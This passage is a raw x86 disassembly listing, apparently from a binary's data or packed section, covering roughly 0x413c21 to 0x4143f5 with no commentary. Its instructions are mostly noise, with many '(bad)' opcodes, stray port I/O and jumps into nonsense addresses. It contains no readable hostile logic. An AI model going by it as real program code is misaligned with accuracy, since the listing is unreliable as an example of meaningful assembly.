  413c21:	and    bh,cl
  413c23:	test   DWORD PTR [eax-0x11c88edc],edi
  413c29:	in     eax,0x16
  413c2b:	ret    
  413c2c:	fcomp  st(1)
  413c2e:	inc    ebp
  413c2f:	clc    
  413c30:	in     al,0x2a
  413c32:	js     0x413bdf
  413c34:	add    ebp,DWORD PTR ds:0x13028f8a
  413c3a:	scas   eax,DWORD PTR es:[edi]
  413c3b:	adc    eax,0x83a462db
  413c40:	cmp    esp,ebx
  413c42:	loopne 0x413c1a
  413c44:	push   ds
  413c45:	out    0x46,eax
  413c47:	test   BYTE PTR [edi],dl
  413c49:	mov    cl,0x9e
  413c4b:	jmp    0x413cc5
  413c4d:	pusha  
  413c4e:	adc    DWORD PTR [edx+0x65],ebp
  413c51:	std    
  413c52:	and    edx,DWORD PTR [edx+0x6f]
  413c55:	jecxz  0x413c0a
  413c57:	sbb    edx,DWORD PTR [eax+0x182ee465]
  413c5d:	(bad)  
  413c5e:	retf   0xd313
  413c61:	lahf   
  413c62:	jne    0x413c7b
  413c64:	xchg   ebp,edx
  413c66:	mov    al,0x98
  413c68:	ror    BYTE PTR [ebp+ebx*1-0x2a5b6d35],cl
  413c6f:	mov    ds:0x9cc78117,eax
  413c74:	adc    al,0x1e
  413c76:	lods   al,BYTE PTR ds:[esi]
  413c77:	jg     0x413cc0
  413c79:	int3   
  413c7a:	sub    DWORD PTR ds:0xafb272b3,edi
  413c80:	push   edx
  413c81:	adc    edx,DWORD PTR [edx+ebp*1]
  413c84:	mov    cl,0x5b
  413c86:	inc    ecx
  413c87:	mov    ds:0xe4f50896,al
  413c8c:	xchg   esp,eax
  413c8d:	jl     0x413d07
  413c8f:	outs   dx,DWORD PTR ds:[esi]
  413c90:	cmp    ah,bh
  413c92:	mov    ds:0xeb1f4289,eax
  413c97:	dec    eax
  413c98:	xor    ecx,ecx
  413c9a:	sbb    edx,esi
  413c9c:	pop    esp
  413c9d:	icebp  
  413c9e:	jnp    0x413cc8
  413ca0:	jns    0x413cb7
  413ca2:	sub    edx,DWORD PTR [ecx+0x1cabeb1b]
  413ca8:	mov    ebp,DWORD PTR [edi-0x1256c940]
  413cae:	sbb    BYTE PTR [ecx],al
  413cb0:	mov    ch,0x36
  413cb2:	jb     0x413c9c
  413cb4:	cmp    ah,ah
  413cb6:	inc    esi
  413cb7:	push   edi
  413cb8:	jmp    0x413c85
  413cba:	(bad)  
  413cbb:	and    eax,DWORD PTR [ecx]
  413cbd:	sar    BYTE PTR [esi+edx*8],cl
  413cc0:	jp     0x413d34
  413cc2:	pop    ebp
  413cc3:	ins    BYTE PTR es:[edi],dx
  413cc4:	mov    edx,ebp
  413cc6:	pop    ecx
  413cc7:	add    dh,0x9a
  413cca:	mov    esp,0x58c4a511
  413ccf:	stos   BYTE PTR es:[edi],al
  413cd0:	pop    ebx
  413cd1:	test   eax,0xc7a6ed1d
  413cd6:	cmp    edx,ebx
  413cd8:	popa   
  413cd9:	mov    ebx,DWORD PTR [ebx]
  413cdb:	xchg   edi,eax
  413cdc:	mov    al,ds:0xb5582188
  413ce1:	lds    edi,FWORD PTR [bx+di+0x7e6]
  413ce6:	(bad)  
  413ce7:	or     ebp,DWORD PTR es:[ebp+0x69]
  413ceb:	xchg   BYTE PTR [esi],al
  413ced:	bound  ebx,QWORD PTR [edi+0x4f]
  413cf0:	imul   edx,DWORD PTR [esi],0x4e
  413cf3:	inc    edi
  413cf4:	xchg   DWORD PTR [ecx-0x74],esi
  413cf7:	data16 es je 0x413d10
  413cfb:	popf   
  413cfc:	pop    ebp
  413cfd:	sbb    eax,0xb489da85
  413d02:	(bad)  
  413d03:	sbb    eax,0x6f9e2dbe
  413d08:	aam    0xba
  413d0a:	(bad)  
  413d0b:	fbstp  TBYTE PTR [edi+0x15]
  413d0e:	repnz rcl DWORD PTR ds:[eax+0x40],1
  413d13:	stos   DWORD PTR es:[edi],eax
  413d14:	lds    ecx,FWORD PTR [eax+0x547c2553]
  413d1a:	and    eax,DWORD PTR ds:0xda320649
  413d20:	ret    0x3efd
  413d23:	pusha  
  413d24:	jmp    0x72d9:0x566ceb36
  413d2b:	inc    edx
  413d2c:	aam    0x58
  413d2e:	fcomp  DWORD PTR [esi+0x7ae4fca5]
  413d34:	mov    edi,0x4ec579d8
  413d39:	add    al,0xb7
  413d3b:	call   0x201ec3c5
  413d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d41:	(bad)  
  413d42:	lock push es
  413d44:	xor    al,0x7f
  413d46:	dec    esi
  413d47:	or     DWORD PTR [esp+ebx*1-0x55],eax
  413d4b:	mov    DWORD PTR [ebx-0x7ed0c40c],edi
  413d51:	test   al,0xf7
  413d53:	shl    DWORD PTR [ebp-0x6b7a2189],0xe9
  413d5a:	xor    eax,0xd0982539
  413d5f:	jbe    0x413da1
  413d61:	mov    edi,0xfcb1d662
  413d66:	out    dx,al
  413d67:	imul   edx,edi,0x6b7a8736
  413d6d:	or     al,0xe
  413d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d70:	(bad)
  413d74:	fist   DWORD PTR [edx]
  413d77:	sbb    bl,BYTE PTR ds:0x18dd3061
  413d7d:	push   ss
  413d7e:	pop    esp
  413d7f:	inc    edi
  413d80:	ja     0x413dcf
  413d82:	sub    ebx,DWORD PTR [esi+0x6d]
  413d85:	into   
  413d86:	and    eax,0x21896c16
  413d8b:	and    BYTE PTR [esi-0x68],dl
  413d8e:	gs sahf 
  413d90:	inc    edx
  413d91:	dec    edi
  413d92:	sbb    ebp,DWORD PTR [ecx+0x20]
  413d95:	dec    ebx
  413d96:	xor    DWORD PTR [ebx-0x76],ebx
  413d99:	cs mov esp,0xfd53c82e
  413d9f:	cmp    BYTE PTR [ecx],bh
  413da1:	cli    
  413da2:	cmp    BYTE PTR ds:[esi+0x47],ah
  413da6:	inc    ebx
  413da7:	jae    0x413db0
  413da9:	xor    al,0x14
  413dab:	push   ecx
  413dac:	(bad)  
  413dad:	js     0x413e1a
  413daf:	or     edx,DWORD PTR [eax-0x2ffc49db]
  413db5:	addr16 jl 0x413de3
  413db8:	dec    esi
  413db9:	(bad)  
  413dba:	(bad)  
  413dbc:	mov    ebp,0x13decfcb
  413dc1:	xchg   BYTE PTR [edi+0x35],cl
  413dc4:	stos   BYTE PTR es:[edi],al
  413dc5:	sub    BYTE PTR cs:[edx],0x6f
  413dc9:	out    0x20,al
  413dcb:	jns    0x413df9
  413dcd:	inc    edx
  413dce:	lahf   
  413dcf:	dec    ebx
  413dd0:	pushf  
  413dd1:	sbb    DWORD PTR [esi-0x3ea683ea],ebp
  413dd7:	lods   eax,DWORD PTR ds:[esi]
  413dd8:	add    al,BYTE PTR ds:0x46f5ead6
  413dde:	fwait
  413ddf:	xor    eax,0xc1908147
  413de4:	test   ecx,0x4dddbb43
  413dea:	cli    
  413deb:	clc    
  413dec:	mov    edx,0x56438fc5
  413df1:	cmc    
  413df2:	jno    0x413e29
  413df4:	test   BYTE PTR [esi-0x55a1106a],dh
  413dfa:	xchg   BYTE PTR [edi+0x6],bh
  413dfd:	cmp    al,ah
  413dff:	aam    0xf
  413e01:	xchg   DWORD PTR [eax-0x699d28ba],esp
  413e07:	jecxz  0x413dce
  413e09:	(bad)  
  413e0a:	addr16 and al,0x95
  413e0d:	cmp    al,0xc1
  413e10:	push   ebp
  413e11:	jle    0x413e06
  413e13:	lock popa 
  413e15:	pop    eax
  413e16:	and    eax,0x4a4eee0a
  413e1b:	xchg   ebp,eax
  413e1c:	sbb    al,0x48
  413e1e:	lahf   
  413e1f:	ins    DWORD PTR es:[edi],dx
  413e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e21:	cwde   
  413e22:	jge    0x413e7e
  413e24:	mov    ebx,ebp
  413e26:	fsub   DWORD PTR [edx+0x1a979eb0]
  413e2c:	(bad)  
  413e2d:	jecxz  0x413e52
  413e2f:	xor    ch,BYTE PTR [ebp+eax*2-0x499c25d2]
  413e36:	iret   
  413e37:	mov    al,0x4d
  413e39:	bound  ebp,QWORD PTR ds:0x70c56632
  413e3f:	dec    bx
  413e41:	lods   eax,DWORD PTR ds:[esi]
  413e42:	fist   DWORD PTR [ecx]
  413e44:	adc    ecx,DWORD PTR [edi-0x48]
  413e47:	push   0xfffffffa
  413e49:	sub    dh,BYTE PTR [esi]
  413e4b:	mov    eax,edx
  413e4d:	repz test eax,0xc98df828
  413e53:	aaa    
  413e54:	out    dx,eax
  413e55:	xchg   ecx,eax
  413e56:	call   0xabb73523
  413e5b:	cli    
  413e5c:	xor    BYTE PTR [edx+0x35bac6de],al
  413e62:	cmp    DWORD PTR [eax-0x7cc7fa5b],esi
  413e68:	ins    DWORD PTR es:[edi],dx
  413e69:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  413e6b:	sbb    esi,DWORD PTR [eax-0x46]
  413e6e:	or     eax,0xb2f3861d
  413e73:	stc    
  413e74:	std    
  413e75:	pop    edi
  413e76:	cld    
  413e77:	pop    ss
  413e78:	inc    esi
  413e79:	inc    eax
  413e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e7b:	mov    BYTE PTR [ebx+0x7b],0x78
  413e7f:	loope  0x413e1a
  413e81:	cli    
  413e82:	sub    ebp,esi
  413e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e86:	aad    0xbf
  413e88:	sbb    BYTE PTR [edx+0x45],0xab
  413e8c:	mov    al,0x11
  413e8e:	(bad)  
  413e8f:	push   0x35
  413e91:	(bad)  
  413e92:	aaa    
  413e93:	push   ebp
  413e94:	jno    0x413e53
  413e96:	and    DWORD PTR [esi+0x33be2ac],0xfe558441
  413ea0:	jbe    0x413e7c
  413ea2:	loope  0x413e77
  413ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ea5:	pop    ecx
  413ea6:	int3   
  413ea7:	and    al,0xe9
  413ea9:	lahf   
  413eaa:	mov    bl,0x4c
  413eac:	loope  0x413e8b
  413eae:	inc    eax
  413eaf:	inc    esi
  413eb0:	sub    dl,BYTE PTR fs:[eax-0x7a4a5a9f]
  413eb7:	imul   esi,DWORD PTR [edi],0x3dbf0f06
  413ebd:	sbb    al,0x4f
  413ebf:	mov    ebx,0xd4830b9
  413ec4:	xchg   dx,ax
  413ec6:	push   0xc86ac30e
  413ecb:	push   ss
  413ecc:	sub    al,0x16
  413ece:	mov    esi,0xa6cc4dee
  413ed3:	retf   0xcec8
  413ed6:	xor    cl,BYTE PTR [edx+eax*1+0x2]
  413eda:	sub    eax,0x46e1a880
  413edf:	ja     0x413eff
  413ee1:	or     esi,esp
  413ee3:	and    al,0x5d
  413ee5:	pop    es
  413ee6:	mov    ss,WORD PTR [edx+0x5d]
  413ee9:	xor    bl,BYTE PTR [eax]
  413eeb:	aad    0xb0
  413eed:	repz inc eax
  413eef:	xor    bh,bl
  413ef1:	and    BYTE PTR [esi+0x32],0xae
  413ef5:	iret   
  413ef6:	jg     0x413f22
  413ef8:	retf   0x1820
  413efb:	xchg   ebp,eax
  413efc:	aas    
  413efd:	xchg   edx,eax
  413efe:	adc    dh,dl
  413f00:	mov    edi,0x5fa741ed
  413f05:	call   0xd68f7188
  413f0a:	or     bl,BYTE PTR [edi]
  413f0c:	out    dx,eax
  413f0d:	sbb    dl,BYTE PTR [edx+0x1133bded]
  413f13:	xchg   edx,eax
  413f14:	and    BYTE PTR [edx],dh
  413f16:	push   esp
  413f17:	stos   BYTE PTR es:[edi],al
  413f18:	repz sub eax,0x4f4100d3
  413f1e:	add    BYTE PTR [ecx],ah
  413f20:	xor    bl,dh
  413f22:	jl     0x413f9c
  413f24:	xchg   esi,eax
  413f25:	mov    ebp,0x7aa28636
  413f2a:	ret    0x2530
  413f2d:	cmc    
  413f2e:	xor    cl,ch
  413f30:	xlat   BYTE PTR ds:[ebx]
  413f31:	xchg   DWORD PTR [ebx+edi*1],esi
  413f34:	mov    dl,0x23
  413f36:	(bad)  
  413f37:	daa    
  413f38:	rcr    ecx,1
  413f3a:	aad    0x0
  413f3c:	fld    DWORD PTR [esi+edx*1+0x0]
  413f40:	xor    al,0x9
  413f42:	and    eax,DWORD PTR [esi]
  413f44:	or     cl,BYTE PTR [ecx+0x24b79048]
  413f4a:	dec    esi
  413f4b:	jbe    0x413fb9
  413f4d:	dec    ecx
  413f4e:	dec    esi
  413f4f:	(bad)
  413f52:	daa    
  413f53:	xor    eax,0xda0fe3d8
  413f58:	cmp    al,0x91
  413f5a:	imul   ebx,DWORD PTR [ebx],0xc4fa081c
  413f60:	fnstenv ds:0x3b60ce51
  413f66:	ret    0x470e
  413f69:	scas   eax,DWORD PTR es:[edi]
  413f6a:	dec    DWORD PTR [ebx-0x11bcc90b]
  413f70:	bound  ecx,QWORD PTR [edx-0x305e7027]
  413f76:	jmp    0xc8a0761b
  413f7b:	cmp    edi,esp
  413f7d:	gs std 
  413f7f:	popf   
  413f80:	mov    ah,0x80
  413f82:	xor    eax,0xbca9cb8e
  413f87:	lods   eax,DWORD PTR ds:[esi]
  413f88:	std    
  413f89:	aas    
  413f8a:	inc    ecx
  413f8b:	es int 0x83
  413f8e:	xchg   eax,eax
  413f90:	cmp    dh,ch
  413f92:	aam    0x77
  413f94:	ficom  DWORD PTR [esi-0x142ea593]
  413f9a:	pop    esp
  413f9b:	cli    
  413f9c:	out    0x71,al
  413f9e:	mov    eax,ds:0x61868d64
  413fa3:	sbb    DWORD PTR [ebx],eax
  413fa5:	shl    DWORD PTR [edi+0x263f736e],cl
  413fab:	int    0x8f
  413fad:	dec    edx
  413fae:	out    dx,al
  413faf:	rcr    BYTE PTR [edx+0x53],0xaf
  413fb3:	lods   eax,DWORD PTR ds:[esi]
  413fb4:	xor    ch,bh
  413fb6:	or     al,0x66
  413fb8:	jne    0x413f79
  413fba:	mov    eax,0xea68f9d6
  413fbf:	aas    
  413fc0:	jmp    0x413fed
  413fc2:	daa    
  413fc3:	sar    DWORD PTR [esi-0x133589c0],0xa8
  413fca:	pop    ecx
  413fcb:	xchg   BYTE PTR [esi],al
  413fcd:	sub    bl,0xa5
  413fd0:	ret    0x7d8f
  413fd3:	xchg   esp,eax
  413fd4:	das    
  413fd5:	sub    ch,BYTE PTR [ecx+0x3b]
  413fd8:	repz scas eax,DWORD PTR es:[edi]
  413fda:	(bad)  
  413fdb:	mov    ebp,0x25a89178
  413fe0:	mov    bh,0xfd
  413fe2:	adc    eax,0x681a627
  413fe7:	das    
  413fe8:	pop    esp
  413fe9:	out    0x3b,eax
  413feb:	push   esi
  413fec:	jnp    0x413f77
  413fee:	les    ebp,FWORD PTR [ebx+0x52]
  413ff1:	mov    DWORD PTR [ebp-0x1e4e6614],eax
  413ff7:	and    esp,0xa0ec9eec
  413ffd:	cld    
  413ffe:	fcomi  st,st(5)
  414000:	inc    esp
  414001:	cwde   
  414002:	dec    ebx
  414003:	or     BYTE PTR [ebp+0x67],ah
  414006:	scas   eax,DWORD PTR es:[edi]
  414007:	or     DWORD PTR [ebp-0x75],edi
  41400a:	je     0x41405f
  41400c:	adc    ebx,0x70
  41400f:	jmp    0xdef144f
  414014:	stos   DWORD PTR es:[edi],eax
  414015:	dec    eax
  414016:	loopne 0x413fb6
  414018:	fld    DWORD PTR [eax-0x4d]
  41401b:	fnsave [ebp+0x44]
  41401e:	xchg   ebp,eax
  41401f:	aad    0xd6
  414021:	mov    edi,DWORD PTR [eax]
  414023:	and    bl,BYTE PTR [edi+0x599afa4c]
  414029:	loopne 0x414087
  41402b:	push   es
  41402c:	dec    ecx
  41402d:	jb     0x414097
  41402f:	loop   0x41403f
  414031:	aaa    
  414032:	sbb    ch,ch
  414034:	aam    0x2
  414036:	(bad)  
  414037:	cmp    dl,BYTE PTR ds:0x996b6730
  41403d:	jge    0x414066
  41403f:	lahf   
  414040:	xor    eax,DWORD PTR [ecx+0x26295a6c]
  414046:	lods   al,BYTE PTR ds:[esi]
  414047:	sbb    BYTE PTR [ebx+0x18],ah
  41404a:	sbb    al,0xc
  41404c:	mov    eax,cs:0x85207bff
  414052:	dec    edx
  414053:	arpl   WORD PTR [edi],bx
  414055:	mov    al,ds:0x8323820b
  41405a:	test   DWORD PTR [eax],ecx
  41405c:	sub    eax,ebp
  41405e:	loop   0x41403a
  414060:	xchg   edi,eax
  414061:	add    BYTE PTR [esi-0x38ab35ff],0xf8
  414068:	jl     0x413ff8
  41406a:	or     edx,DWORD PTR [edi-0x7b0e1e76]
  414070:	dec    BYTE PTR [edx-0x5e724209]
  414076:	mov    ecx,0x9e2d420f
  41407b:	imul   eax,eax,0xffffffca
  41407e:	cmovbe esp,esp
  414081:	jle    0x41406c
  414083:	mov    cl,0x65
  414085:	ret    0x2245
  414088:	cmp    bl,dl
  41408a:	in     al,dx
  41408b:	mov    ch,0x49
  41408d:	and    ecx,esi
  41408f:	fwait
  414090:	iret   
  414091:	adc    eax,0xfbef261c
  414096:	or     BYTE PTR [eax],ah
  414098:	push   edx
  414099:	pop    ebp
  41409a:	test   BYTE PTR [edx],dh
  41409c:	ror    eax,1
  41409e:	mov    ah,0xd9
  4140a0:	inc    edi
  4140a1:	mov    dl,0x3c
  4140a3:	or     ch,BYTE PTR [ebx+0x3d16e9e3]
  4140a9:	idiv   BYTE PTR [edx]
  4140ab:	fld    QWORD PTR [eax]
  4140ad:	(bad)  
  4140ae:	or     ebp,DWORD PTR [ecx]
  4140b0:	daa    
  4140b1:	xchg   ebp,eax
  4140b2:	ja     0x414062
  4140b4:	in     eax,dx
  4140b5:	mov    al,0x7b
  4140b7:	jp     0x4140da
  4140b9:	and    ebp,DWORD PTR [ebx]
  4140bb:	out    0xc8,eax
  4140bd:	pop    es
  4140be:	cli    
  4140bf:	jmp    0x6d0f9ae1
  4140c4:	and    al,0x7e
  4140c6:	mov    al,ds:0x4ac1abf8
  4140cb:	outs   dx,DWORD PTR ds:[esi]
  4140cc:	push   ecx
  4140cd:	xlat   BYTE PTR ds:[ebx]
  4140ce:	cld    
  4140cf:	add    al,0xa
  4140d1:	lahf   
  4140d2:	xor    bh,BYTE PTR [ecx+0x7f]
  4140d5:	out    dx,al
  4140d6:	retf   
  4140d7:	pop    es
  4140d8:	and    esp,DWORD PTR [ebx+0x757bf236]
  4140de:	arpl   WORD PTR [ebx+0xb],di
  4140e1:	adc    dh,BYTE PTR [edx-0x28]
  4140e4:	jmp    0x41411f
  4140e6:	gs repnz retf 
  4140e9:	cmp    bl,BYTE PTR [edi-0x69]
  4140ec:	sub    ebx,ecx
  4140ee:	jle    0x4140f8
  4140f0:	popa   
  4140f1:	push   esi
  4140f2:	push   cs
  4140f3:	dec    esp
  4140f4:	dec    edi
  4140f5:	out    0xb1,al
  4140f7:	fbld   TBYTE PTR [ebx+0x17]
  4140fa:	mov    bh,0xf1
  4140fc:	mov    DWORD PTR [ebp*8+0x7e6847c4],0xfd86f5b2
  414107:	mov    esp,0xb3ae00fe
  41410c:	inc    esi
  41410d:	imul   ebx,DWORD PTR [esi],0xffffff99
  414110:	in     eax,0xd1
  414112:	into   
  414113:	scas   al,BYTE PTR es:[edi]
  414114:	imul   edx,esp,0xe0b14d25
  41411a:	pusha  
  41411b:	xchg   esp,eax
  41411c:	out    0xd0,eax
  41411e:	cmp    BYTE PTR fs:[edx-0x2007d827],dl
  414125:	popa   
  414126:	adc    eax,0x5e6d071
  41412b:	inc    ebx
  41412c:	scas   al,BYTE PTR es:[edi]
  41412d:	mov    ss,WORD PTR [ebp-0x14]
  414130:	rcr    BYTE PTR [edx+0xb],1
  414133:	mov    dl,0x72
  414135:	jmp    0x9c4e:0xe3b77964
  41413c:	stos   BYTE PTR es:[edi],al
  41413d:	pop    eax
  41413e:	(bad)  
  41413f:	aam    0x60
  414141:	mov    edi,0x43a21d4d
  414146:	pmuludq mm0,mm3
  414149:	cli    
  41414a:	mov    WORD PTR [ebx],cs
  41414c:	xchg   ch,ah
  41414e:	mov    ds:0x1686d83f,eax
  414153:	or     ebx,DWORD PTR [esi+0x437cdbeb]
  414159:	sub    BYTE PTR [edx+0x4ae757cb],bl
  41415f:	xchg   edi,eax
  414160:	out    0x44,al
  414162:	sti    
  414163:	cld    
  414164:	inc    edx
  414165:	mov    ah,0x33
  414167:	xor    esp,DWORD PTR [ebp+0x2299a08c]
  41416d:	arpl   WORD PTR [ecx+0x50],bp
  414170:	call   0x4ced:0xe410bd6d
  414177:	jne    0x41418d
  414179:	mov    ch,0x92
  41417b:	ss or  ebp,ebx
  41417e:	test   DWORD PTR [esi+0x727eb69],0xf5c4336f
  414188:	in     al,dx
  414189:	jae    0x41416e
  41418b:	jb     0x414158
  41418d:	daa    
  41418e:	rcl    DWORD PTR [ebp+0x6e],1
  414191:	test   BYTE PTR [edi+eiz*1-0x69],0x3f
  414196:	adc    DWORD PTR [esi],eax
  414198:	call   0x67e63593
  41419d:	int3   
  41419e:	mov    al,ds:0xc20f2b57
  4141a3:	mov    DWORD PTR [edx+0x5f],ecx
  4141a6:	psubusw mm2,QWORD PTR [esi+edx*2+0x62271320]
  4141ae:	rcl    DWORD PTR [edi+0x59a053be],0x74
  4141b5:	std    
  4141b6:	sub    al,0xe5
  4141b8:	pushf  
  4141b9:	loope  0x414226
  4141bb:	sub    DWORD PTR [esp+esi*1+0x55c0107c],edx
  4141c2:	cmp    eax,DWORD PTR [edi+0x9]
  4141c5:	push   ebx
  4141c6:	ins    BYTE PTR es:[edi],dx
  4141c7:	push   ds
  4141c8:	sub    eax,0xa7d3b586
  4141cd:	leave  
  4141ce:	retf   
  4141cf:	shl    BYTE PTR [edi+0x1041f7bf],cl
  4141d5:	sub    edi,edi
  4141d7:	add    DWORD PTR [edi+edx*4+0x5f],ebp
  4141db:	lds    ebp,FWORD PTR [ecx-0x4b789601]
  4141e1:	repnz das 
  4141e3:	adc    al,0x57
  4141e5:	xor    al,0xe6
  4141e7:	or     DWORD PTR [esi+0x373c8f76],esp
  4141ed:	mov    ebp,0xc1152cb6
  4141f2:	pop    ss
  4141f3:	sbb    BYTE PTR [esi],0x40
  4141f6:	add    BYTE PTR [ecx],cl
  4141f8:	mul    DWORD PTR [edi]
  4141fa:	(bad)  
  4141fb:	in     al,dx
  4141fc:	cwde   
  4141fd:	leave  
  4141fe:	retf   
  4141ff:	or     ch,dl
  414201:	cdq    
  414202:	pop    edx
  414203:	xchg   ebp,eax
  414204:	mov    esi,0x2823937d
  414209:	sti    
  41420a:	scas   eax,DWORD PTR es:[edi]
  41420b:	adc    bl,BYTE PTR [ebp-0x76]
  41420e:	push   edi
  41420f:	and    ecx,DWORD PTR [edx-0x678c6cb1]
  414215:	jno    0x4141d3
  414217:	daa    
  414218:	mov    eax,ds:0xf7c47895
  41421d:	sahf   
  41421e:	pushf  
  41421f:	xor    BYTE PTR ds:0xc8a0711a,ah
  414225:	or     eax,0x6a206f0c
  41422a:	popa   
  41422b:	das    
  41422c:	out    0x6d,eax
  41422e:	aaa    
  41422f:	cld    
  414230:	arpl   WORD PTR ds:0x138b6d72,cx
  414236:	cmp    ebx,DWORD PTR [edi+0x68]
  414239:	jl     0x4141cf
  41423b:	push   ebp
  41423c:	sub    BYTE PTR ds:0x32324032,bl
  414242:	div    dl
  414244:	pop    edi
  414245:	mov    eax,0x6cf80b1
  41424a:	add    al,0xd8
  41424c:	jne    0x41429f
  41424e:	mov    cl,0x1e
  414250:	les    ebp,FWORD PTR [edx+0x48583c19]
  414256:	(bad)  
  414257:	stos   DWORD PTR es:[edi],eax
  414258:	push   edi
  414259:	retf   0x1e4f
  41425c:	sbb    al,0x66
  41425e:	aad    0xb
  414260:	xor    dh,BYTE PTR [edx-0x38]
  414263:	(bad)  
  414264:	shl    DWORD PTR [ebp+0x52],0xa1
  414268:	retf   0xc24f
  41426b:	int3   
  41426c:	and    BYTE PTR [ebp-0x7c],ah
  41426f:	xchg   esp,eax
  414270:	xor    edx,0xc4450ed
  414276:	fidivr WORD PTR ss:[edx+edi*1]
  41427a:	sub    BYTE PTR [edx+0x129cb664],dh
  414280:	push   esp
  414281:	outs   dx,DWORD PTR ds:[esi]
  414282:	pop    edx
  414283:	mov    bl,0x7f
  414285:	repz sub eax,0x618b8103
  41428b:	dec    esi
  41428c:	es sub edx,ebx
  41428f:	mov    bl,0x68
  414291:	stc    
  414292:	(bad)  
  414293:	adc    al,0x6
  414295:	mov    ah,0xad
  414297:	loopne 0x414301
  414299:	mov    dl,0x5c
  41429b:	les    edi,FWORD PTR [ecx+0x4c0bb2b8]
  4142a1:	sbb    BYTE PTR [esi],ch
  4142a3:	or     dh,ch
  4142a5:	sbb    dh,cl
  4142a7:	jl     0x414246
  4142a9:	fcmovbe st,st(1)
  4142ab:	mov    ch,0xbe
  4142ad:	xor    esi,DWORD PTR [ebx-0x3edc72c2]
  4142b3:	push   es
  4142b4:	xor    ah,BYTE PTR [ebp+0x480d456e]
  4142ba:	(bad)
  4142be:	pop    ebx
  4142bf:	push   0xffffffde
  4142c1:	das    
  4142c2:	and    DWORD PTR [edx+0x61],esp
  4142c5:	sbb    cl,ch
  4142c7:	jno    0x41430b
  4142c9:	xchg   BYTE PTR ds:0xd1f99943,dl
  4142cf:	cwde   
  4142d0:	adc    DWORD PTR [ebx+0x67],ecx
  4142d3:	sbb    eax,0x26d46c6f
  4142d8:	cmp    ecx,DWORD PTR [edx-0x5c]
  4142db:	(bad)  
  4142dc:	cmp    eax,0x715faaa
  4142e1:	jle    0x4142bc
  4142e3:	mov    DWORD PTR [edi+0x38429d8f],ecx
  4142e9:	xchg   esp,eax
  4142ea:	dec    edx
  4142eb:	cmp    eax,0x5ae72930
  4142f0:	ds jge 0x4142fe
  4142f3:	fsub   st(5),st
  4142f5:	inc    ebx
  4142f6:	sub    al,BYTE PTR [edx+eiz*2-0xf]
  4142fa:	xchg   edx,eax
  4142fb:	lea    eax,[edi]
  4142fd:	or     BYTE PTR [ebp+0x64fa482],0x56
  414304:	pop    ds
  414305:	jmp    FWORD PTR [eax-0x5427a4c]
  41430b:	stc    
  41430c:	mov    ecx,0x2e39a101
  414311:	lea    ecx,[ebp-0x26]
  414314:	aam    0x12
  414316:	fild   WORD PTR [edi+0x2ae20d11]
  41431c:	dec    ebp
  41431d:	nop
  41431e:	ret    
  41431f:	add    BYTE PTR [ebx-0x3330786d],cl
  414325:	in     eax,dx
  414326:	mov    edx,0x82086d80
  41432b:	pop    ds
  41432c:	pop    ebx
  41432d:	dec    esi
  41432e:	arpl   dx,ax
  414330:	cmp    BYTE PTR ds:0x6bce848,cl
  414336:	add    ebx,DWORD PTR ds:0x1554da09
  41433c:	mov    esp,0x7c02d737
  414341:	jecxz  0x414394
  414343:	xchg   edi,eax
  414344:	out    0xa8,eax
  414346:	pop    esi
  414347:	hlt    
  414348:	scas   al,BYTE PTR es:[edi]
  414349:	mov    ecx,0xb8b29738
  41434e:	xchg   ebx,eax
  41434f:	scas   eax,DWORD PTR es:[edi]
  414350:	sbb    ebp,DWORD PTR [edx+ecx*8+0x1cdfbec0]
  414357:	sub    al,0xc1
  414359:	bound  ebx,QWORD PTR [eax+0x7b]
  41435c:	(bad)  
  41435d:	mov    ebx,0x7dfce768
  414362:	xchg   edx,eax
  414363:	xor    eax,0x27941fc3
  414368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414369:	popa   
  41436a:	or     ecx,ecx
  41436c:	inc    edi
  41436d:	fild   DWORD PTR [ebx]
  41436f:	xor    ecx,DWORD PTR [esi]
  414371:	cmp    BYTE PTR [edi+0x0],bh
  414374:	push   0xc8c396e
  414379:	jne    0x41431f
  41437b:	inc    esi
  41437c:	mov    eax,ds:0x7c1a9d55
  414381:	cmp    al,0x8a
  414383:	pop    ebx
  414384:	push   edx
  414385:	hlt    
  414386:	xor    cl,bl
  414388:	sub    eax,DWORD PTR [eax-0x1d]
  41438b:	mov    al,0x52
  41438d:	in     al,0x7f
  41438f:	stos   BYTE PTR es:[edi],al
  414390:	aas    
  414391:	rol    BYTE PTR [esi-0xe],1
  414394:	adc    esp,edx
  414396:	and    eax,0xfd4a9557
  41439b:	outs   dx,BYTE PTR ds:[esi]
  41439c:	aam    0xc6
  41439e:	int    0x8f
  4143a0:	sbb    edi,DWORD PTR [eax+0x547bffa0]
  4143a6:	fsub   st,st(5)
  4143a8:	ror    ebp,0x1b
  4143ab:	(bad)  
  4143ac:	int    0x9
  4143ae:	mov    ebx,esp
  4143b0:	add    al,0xba
  4143b2:	inc    esi
  4143b3:	dec    eax
  4143b4:	mov    al,ds:0x49bf38bb
  4143b9:	daa    
  4143ba:	or     ah,dh
  4143bc:	and    bh,al
  4143be:	pop    esi
  4143bf:	mov    bh,0xb9
  4143c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c2:	dec    eax
  4143c3:	sub    BYTE PTR [edx],dl
  4143c5:	cwde   
  4143c6:	cmc    
  4143c7:	arpl   WORD PTR ds:0x9291271f,cx
  4143cd:	add    BYTE PTR [eax],cl
  4143cf:	jno    0x4143bd
  4143d1:	push   eax
  4143d2:	jbe    0x414371
  4143d4:	inc    eax
  4143d5:	ret    
  4143d6:	in     al,dx
  4143d7:	sub    dh,BYTE PTR [eax+0x7c]
  4143da:	repz ss mov ebp,cs
  4143de:	or     ebp,0x415f287c
  4143e4:	inc    ecx
  4143e5:	push   ecx
  4143e6:	xchg   DWORD PTR ss:[ecx],ebx
  4143e9:	out    dx,eax
  4143ea:	(bad)  [esi+0x6082474d]
  4143f0:	scas   eax,DWORD PTR es:[edi]
  4143f1:	lods   eax,DWORD PTR ds:[esi]
  4143f2:	ja     0x41441f
  4143f4:	ret    
  4143f5:	ja     0x414458
